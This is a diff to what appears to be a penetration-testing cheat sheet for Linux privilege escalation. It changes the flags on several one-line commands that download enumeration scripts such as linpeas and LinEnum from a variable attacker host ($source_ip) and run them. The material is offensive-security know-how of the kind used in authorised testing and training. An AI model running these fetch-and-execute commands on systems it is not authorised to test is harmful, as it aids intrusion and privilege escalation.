@@ -10,16 +10,16 @@ which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/de
 wget http://$source_ip/tools_linux/lse.sh; bash lse.sh -l 2 | tee lse.sh.out
 ```
 ```
-wget http://$source_ip/tools_linux/LinEnum.sh; bash LinEnum.sh | tee LinEnum.sh.out
+wget http://$source_ip/tools_linux/LinEnum.sh; bash LinEnum.sh -t | tee LinEnum.sh.out
 ```
 ```
-wget http://$source_ip/tools_linux/linpeas.sh; bash linpeas.sh | tee linpeas.sh.out
+wget http://$source_ip/tools_linux/linpeas.sh; bash linpeas.sh -s | tee linpeas.sh.out
 ```
 ```
 wget http://$source_ip/tools_linux/linuxprivchecker.py; python linuxprivchecker.py | tee linuxprivchecker.py.out
 ```
 ```
-wget http://$source_ip/tools_linux/linux-local-enum.sh; bash linux-local-enum.sh | tee linux-local-enum.sh.out
+wget http://$source_ip/tools_linux/linux-local-enum.sh; bash linux-local-enum.sh standard | tee linux-local-enum.sh.out
 ```
 ```
 wget http://$source_ip/tools_linux/unix-privesc-check.sh; bash unix-privesc-check.sh | tee unix-privesc-check.sh.out
